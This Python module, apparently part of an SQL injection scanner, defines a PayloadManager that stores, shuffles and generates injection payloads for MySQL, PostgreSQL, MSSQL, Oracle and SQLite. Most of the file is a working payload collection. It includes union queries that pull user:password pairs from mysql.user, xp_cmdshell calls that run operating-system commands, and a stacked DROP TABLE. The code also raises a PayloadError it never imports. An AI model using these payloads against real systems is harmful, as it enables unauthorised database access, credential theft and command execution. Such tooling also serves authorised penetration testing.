"""
SQL injection payload management and generation
"""

import random
import string
from typing import List, Dict, Any, Optional
from .models import InjectionType, DatabaseType


class PayloadManager:
    """
    Manages SQL injection payloads for different attack types and databases
    """
    
    def __init__(self):
        self.payloads = self._load_default_payloads()
        self.database_specific = self._load_database_payloads()
    
    def _load_default_payloads(self) -> Dict[InjectionType, List[str]]:
        """Load default payloads for each injection type"""
        return {
            InjectionType.BOOLEAN_BLIND: [
                "' AND '1'='1",
                "' AND '1'='2", 
                "' OR '1'='1",
                "' OR '1'='2",
                "1 AND 1=1",
                "1 AND 1=2",
                "1 OR 1=1",
                "1 OR 1=2",
                "' AND SLEEP(0)='0",
                "' AND 1=1 --",
                "' AND 1=2 --",
                "') AND ('1'='1",
                "') AND ('1'='2",
                "' AND (SELECT 1)=1 --",
                "' AND (SELECT 1)=2 --",
            ],
            
            InjectionType.TIME_BLIND: [
                "'; WAITFOR DELAY '00:00:05' --",
                "' AND SLEEP(5) --",
                "' OR SLEEP(5) --",
                "'; SELECT PG_SLEEP(5) --",
                "' UNION SELECT SLEEP(5) --",
                "1; WAITFOR DELAY '00:00:05'",
                "1 AND SLEEP(5)",
                "1 OR SLEEP(5)",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                "' AND BENCHMARK(5000000,MD5(1)) --",
                "'; exec master..xp_cmdshell 'ping -n 5 127.0.0.1' --",
            ],
            
            InjectionType.UNION_BASED: [
                "' UNION SELECT NULL --",
                "' UNION SELECT NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT user(),database(),version() --",
                "' UNION SELECT schema_name FROM information_schema.schemata --",
                "' UNION SELECT table_name FROM information_schema.tables --",
                "' UNION SELECT column_name FROM information_schema.columns --",
                "1 UNION SELECT NULL",
                "1 UNION SELECT user()",
                "1 UNION SELECT version()",
                "1 UNION SELECT database()",
                "' UNION ALL SELECT NULL --",
                "' UNION ALL SELECT 1,2,3,4,5 --",
            ],
            
            InjectionType.ERROR_BASED: [
                "'",
                "''",
                "\"",
                "\"\"",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1) --",
                "' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT version())a)b)) --",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --",
                "1 AND ROW(1,1) > (SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),version(),CHAR(95),CHAR(33),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)",
                "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) --",
            ],
            
            InjectionType.STACKED_QUERIES: [
                "'; INSERT INTO test VALUES(1) --",
                "'; CREATE TEMPORARY TABLE temp(id INT) --",
                "'; DROP TABLE temp --",
                "'; SELECT version() --",
                "1; SELECT version()",
                "1; SELECT user()",
                "1; SELECT database()",
                "'; EXEC xp_cmdshell('dir') --",
                "'; DECLARE @test VARCHAR(100); SET @test='test'; SELECT @test --",
            ]
        }
    
    def _load_database_payloads(self) -> Dict[DatabaseType, Dict[str, List[str]]]:
        """Load database-specific payloads"""
        return {
            DatabaseType.MYSQL: {
                "version": [
                    "' UNION SELECT @@version --",
                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e)) --",
                    "' OR 1 GROUP BY CONCAT(@@version,FLOOR(RAND(0)*2)) HAVING MIN(0) --",
                ],
                "users": [
                    "' UNION SELECT user FROM mysql.user --",
                    "' UNION SELECT CONCAT(user,':',password) FROM mysql.user --",
                ],
                "databases": [
                    "' UNION SELECT schema_name FROM information_schema.schemata --",
                    "' UNION SELECT database() --",
                ],
                "tables": [
                    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' --",
                ]
            },
            
            DatabaseType.POSTGRESQL: {
                "version": [
                    "' UNION SELECT version() --",
                    "'; SELECT version() --",
                ],
                "users": [
                    "' UNION SELECT usename FROM pg_user --",
                    "' UNION SELECT rolname FROM pg_roles --",
                ],
                "databases": [
                    "' UNION SELECT datname FROM pg_database --",
                    "' UNION SELECT current_database() --",
                ],
                "tables": [
                    "' UNION SELECT tablename FROM pg_tables WHERE schemaname='public' --",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' --",
                ]
            },
            
            DatabaseType.MSSQL: {
                "version": [
                    "' UNION SELECT @@version --",
                    "'; SELECT @@version --",
                ],
                "users": [
                    "' UNION SELECT name FROM sys.syslogins --",
                    "' UNION SELECT loginname FROM master..syslogins --",
                ],
                "databases": [
                    "' UNION SELECT name FROM sys.databases --",
                    "' UNION SELECT db_name() --",
                ],
                "tables": [
                    "' UNION SELECT name FROM sys.tables --",
                    "' UNION SELECT table_name FROM information_schema.tables --",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' --",
                ]
            },
            
            DatabaseType.ORACLE: {
                "version": [
                    "' UNION SELECT banner FROM v$version --",
                    "' UNION SELECT version FROM v$instance --",
                ],
                "users": [
                    "' UNION SELECT username FROM all_users --",
                    "' UNION SELECT user FROM dual --",
                ],
                "databases": [
                    "' UNION SELECT global_name FROM global_name --",
                    "' UNION SELECT instance_name FROM v$instance --",
                ],
                "tables": [
                    "' UNION SELECT table_name FROM all_tables --",
                    "' UNION SELECT table_name FROM user_tables --",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='TARGET_TABLE' --",
                ]
            },
            
            DatabaseType.SQLITE: {
                "version": [
                    "' UNION SELECT sqlite_version() --",
                ],
                "tables": [
                    "' UNION SELECT name FROM sqlite_master WHERE type='table' --",
                ],
                "columns": [
                    "' UNION SELECT sql FROM sqlite_master WHERE name='TARGET_TABLE' --",
                ]
            }
        }
    
    def get_payloads(self, injection_type: InjectionType, 
                    database_type: Optional[DatabaseType] = None,
                    limit: Optional[int] = None) -> List[str]:
        """
        Get payloads for specific injection type and database
        
        Args:
            injection_type: Type of injection to get payloads for
            database_type: Optional database type for specific payloads
            limit: Maximum number of payloads to return
            
        Returns:
            List of payload strings
        """
        payloads = self.payloads.get(injection_type, []).copy()
        
        # Add database-specific payloads if specified
        if database_type and database_type in self.database_specific:
            db_payloads = self.database_specific[database_type]
            for category_payloads in db_payloads.values():
                payloads.extend(category_payloads)
        
        # Shuffle for variety
        random.shuffle(payloads)
        
        # Apply limit if specified
        if limit:
            payloads = payloads[:limit]
        
        return payloads
    
    def get_detection_payloads(self) -> Dict[str, List[str]]:
        """Get payloads specifically for database detection"""
        return {
            "mysql": [
                "' AND 'mysql'='mysql",
                "' UNION SELECT @@version --",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e)) --",
            ],
            "postgresql": [
                "' AND 'postgresql'='postgresql",
                "' UNION SELECT version() --",
                "'; SELECT version() --",
            ],
            "mssql": [
                "' AND 'mssql'='mssql", 
                "' UNION SELECT @@version --",
                "'; SELECT @@version --",
            ],
            "oracle": [
                "' AND 'oracle'='oracle",
                "' UNION SELECT banner FROM v$version --",
            ],
            "sqlite": [
                "' AND 'sqlite'='sqlite",
                "' UNION SELECT sqlite_version() --",
            ]
        }
    
    def generate_custom_payload(self, injection_type: InjectionType, 
                               custom_data: str = None) -> str:
        """
        Generate a custom payload with user data
        
        Args:
            injection_type: Type of injection
            custom_data: Custom data to inject
            
        Returns:
            Generated payload string
        """
        if custom_data is None:
            custom_data = self._generate_random_string()
        
        templates = {
            InjectionType.BOOLEAN_BLIND: f"' AND '{custom_data}'='{custom_data}",
            InjectionType.TIME_BLIND: f"' AND SLEEP(5) AND '{custom_data}'='{custom_data}",
            InjectionType.UNION_BASED: f"' UNION SELECT '{custom_data}' --",
            InjectionType.ERROR_BASED: f"' AND EXTRACTVALUE(1, CONCAT(0x7e, '{custom_data}', 0x7e)) --",
            InjectionType.STACKED_QUERIES: f"'; SELECT '{custom_data}' --"
        }
        
        return templates.get(injection_type, f"' OR '{custom_data}'='{custom_data}")
    
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate a random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def add_custom_payloads(self, injection_type: InjectionType, payloads: List[str]):
        """Add custom payloads to the payload set"""
        if injection_type not in self.payloads:
            self.payloads[injection_type] = []
        self.payloads[injection_type].extend(payloads)
    
    def load_payloads_from_file(self, file_path: str, injection_type: InjectionType):
        """Load payloads from file"""
        try:
            with open(file_path, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.add_custom_payloads(injection_type, payloads)
        except FileNotFoundError:
            raise PayloadError(f"Payload file not found: {file_path}")
        except Exception as e:
            raise PayloadError(f"Error loading payloads from file: {e}")
    
    def get_payload_statistics(self) -> Dict[str, int]:
        """Get statistics about loaded payloads"""
        stats = {}
        for injection_type, payloads in self.payloads.items():
            stats[injection_type.value] = len(payloads)
        
        total_db_payloads = sum(
            sum(len(category) for category in db_payloads.values())
            for db_payloads in self.database_specific.values()
        )
        
        stats['total_default'] = sum(stats.values())
        stats['total_database_specific'] = total_db_payloads
        stats['total_all'] = stats['total_default'] + total_db_payloads
        
        return stats


# Quick payload access functions
def get_boolean_payloads(limit: int = 10) -> List[str]:
    """Get boolean-based blind injection payloads"""
    manager = PayloadManager()
    return manager.get_payloads(InjectionType.BOOLEAN_BLIND, limit=limit)

def get_time_payloads(limit: int = 10) -> List[str]:
    """Get time-based blind injection payloads"""
    manager = PayloadManager()
    return manager.get_payloads(InjectionType.TIME_BLIND, limit=limit)

def get_union_payloads(limit: int = 10) -> List[str]:
    """Get union-based injection payloads"""
    manager = PayloadManager()
    return manager.get_payloads(InjectionType.UNION_BASED, limit=limit)

def get_error_payloads(limit: int = 10) -> List[str]:
    """Get error-based injection payloads"""
    manager = PayloadManager()
    return manager.get_payloads(InjectionType.ERROR_BASED, limit=limit)